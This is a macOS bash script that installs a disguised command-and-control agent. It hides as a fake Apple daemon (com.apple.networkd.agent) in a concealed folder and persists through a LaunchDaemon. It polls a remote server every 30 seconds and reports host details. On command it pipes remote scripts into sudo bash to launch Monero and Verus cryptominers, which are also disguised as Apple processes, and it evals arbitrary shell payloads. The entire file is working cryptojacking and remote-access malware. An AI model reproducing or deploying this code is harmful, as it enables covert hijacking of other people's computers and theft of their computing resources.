#!/usr/bin/env bash
# ============================================================
# agent.sh — Silent Command Center agent for macOS
# Polls VPS every 30s, executes commands, reports status
# Process: com.apple.networkd.agent
# Install: sudo curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/agent.sh | sudo bash
# ============================================================

CC_URL="https://cc.snumcaj.com"
CC_TOKEN="changeme123"   # Must match CC_TOKEN on VPS
POLL_INTERVAL=30

DISGUISE="com.apple.networkd.agent"
INSTALL_DIR="/Library/Application Support/.ccagent"
AGENT_SCRIPT="$INSTALL_DIR/agent.sh"
LOG_PATH="/Library/Logs/${DISGUISE}.log"
PLIST_PATH="/Library/LaunchDaemons/${DISGUISE}.plist"

if [[ $EUID -ne 0 ]]; then
  echo "[!] Run with sudo"
  exit 1
fi

# ---- Get system info ----
LOCAL_IP=$(ifconfig | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | head -1)
IP_LAST=$(echo "$LOCAL_IP" | awk -F. '{print $4}')
NODE_ID="mac-${IP_LAST:-$(hostname | md5 | cut -c1-6)}"
HOSTNAME=$(hostname)
MACOS=$(sw_vers -productVersion)
CORES=$(sysctl -n hw.logicalcpu)
MAIN_IF=$(route -n get default 2>/dev/null | grep interface | awk '{print $2}' | head -1)
MAC_ADDR=$(ifconfig "$MAIN_IF" 2>/dev/null | grep ether | awk '{print $2}' | head -1)

echo "[*] Installing agent as $NODE_ID on $HOSTNAME..."

# ---- Install agent script ----
mkdir -p "$INSTALL_DIR"
cat > "$AGENT_SCRIPT" << 'AGENT_EOF'
#!/usr/bin/env bash
CC_URL="https://cc.snumcaj.com"
CC_TOKEN="changeme123"
POLL_INTERVAL=30
LOG_PATH="/Library/Logs/com.apple.networkd.agent.log"

LOCAL_IP=$(ifconfig | grep 'inet ' | grep -v '127.0.0.1' | awk '{print $2}' | head -1)
IP_LAST=$(echo "$LOCAL_IP" | awk -F. '{print $4}')
NODE_ID="mac-${IP_LAST:-$(hostname | md5 | cut -c1-6)}"
HOSTNAME=$(hostname)
MACOS=$(sw_vers -productVersion)
CORES=$(sysctl -n hw.logicalcpu)

get_hashrate() {
  # Check VRSC miner log
  local log1="/Library/Logs/com.apple.coremediad.log"
  local log2="/Library/Logs/com.apple.coremedia.network.log"
  local hr=""
  for log in "$log1" "$log2"; do
    if [[ -f "$log" ]]; then
      hr=$(tail -50 "$log" 2>/dev/null | grep -o 'speed.*H/s' | tail -1 | awk '{print $2, $3}')
      [[ -n "$hr" ]] && break
    fi
  done
  echo "${hr:-0}"
}

get_miner() {
  pgrep -f "com.apple.coremediad" > /dev/null 2>&1 && echo "vrsc" && return
  pgrep -f "com.apple.coremedia.network" > /dev/null 2>&1 && echo "xmr" && return
  echo "none"
}

execute_command() {
  local action="$1"
  local payload="$2"
  echo "[$(date)] Executing: $action $payload" >> "$LOG_PATH"

  case "$action" in
    mine_vrsc)
      sudo curl -fsSL "https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_gpu.sh?$(date +%s)" | sudo bash >> "$LOG_PATH" 2>&1 &
      ;;
    mine_xmr)
      sudo curl -fsSL "https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_xmr.sh?$(date +%s)" | sudo bash >> "$LOG_PATH" 2>&1 &
      ;;
    stop)
      pkill -9 -f "com.apple.coremediad" 2>/dev/null
      pkill -9 -f "com.apple.coremedia.network" 2>/dev/null
      launchctl unload /Library/LaunchDaemons/com.apple.coremediad.plist 2>/dev/null
      launchctl unload /Library/LaunchDaemons/com.apple.coremedia.network.plist 2>/dev/null
      ;;
    remove)
      curl -fsSL "https://raw.githubusercontent.com/sajalsoumalya/vps/main/remove_mine.sh?$(date +%s)" | bash >> "$LOG_PATH" 2>&1
      curl -fsSL "https://raw.githubusercontent.com/sajalsoumalya/vps/main/remove_xmr.sh?$(date +%s)" | bash >> "$LOG_PATH" 2>&1
      ;;
    update)
      # Re-run current miner to update
      MINER=$(get_miner)
      [[ "$MINER" == "vrsc" ]] && sudo curl -fsSL "https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_gpu.sh?$(date +%s)" | sudo bash >> "$LOG_PATH" 2>&1 &
      [[ "$MINER" == "xmr" ]] && sudo curl -fsSL "https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine_xmr.sh?$(date +%s)" | sudo bash >> "$LOG_PATH" 2>&1 &
      ;;
    shell)
      # Execute arbitrary shell command
      eval "$payload" >> "$LOG_PATH" 2>&1
      ;;
  esac
}

# ---- Main polling loop ----
echo "[$(date)] Agent started — $NODE_ID" >> "$LOG_PATH"

while true; do
  HASHRATE=$(get_hashrate)
  MINER=$(get_miner)
  STATUS="mining"
  [[ "$MINER" == "none" ]] && STATUS="idle"

  RESPONSE=$(curl -fsSL -X POST "$CC_URL/heartbeat" \
    -H "Authorization: Bearer $CC_TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"node_id\":\"$NODE_ID\",\"ip\":\"$LOCAL_IP\",\"hostname\":\"$HOSTNAME\",\"hashrate\":\"$HASHRATE\",\"miner\":\"$MINER\",\"status\":\"$STATUS\",\"macos\":\"$MACOS\",\"cores\":$CORES}" \
    2>/dev/null)

  # Execute command if received
  CMD_ACTION=$(echo "$RESPONSE" | python3 -c "import json,sys; d=json.load(sys.stdin); c=d.get('command'); print(c['action'] if c else '')" 2>/dev/null)
  CMD_PAYLOAD=$(echo "$RESPONSE" | python3 -c "import json,sys; d=json.load(sys.stdin); c=d.get('command'); print(c.get('payload','') if c else '')" 2>/dev/null)

  if [[ -n "$CMD_ACTION" ]]; then
    execute_command "$CMD_ACTION" "$CMD_PAYLOAD"
  fi

  sleep $POLL_INTERVAL
done
AGENT_EOF
chmod +x "$AGENT_SCRIPT"

# ---- Install LaunchDaemon ----
cat > "$PLIST_PATH" << PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>${DISGUISE}</string>
  <key>ProgramArguments</key><array>
    <string>/bin/bash</string>
    <string>${AGENT_SCRIPT}</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>StandardOutPath</key><string>${LOG_PATH}</string>
  <key>StandardErrorPath</key><string>${LOG_PATH}</string>
</dict></plist>
PLIST

launchctl load -w "$PLIST_PATH"
echo "[*] Agent installed as $NODE_ID — polling $CC_URL every ${POLL_INTERVAL}s"
echo "[*] Log: $LOG_PATH"
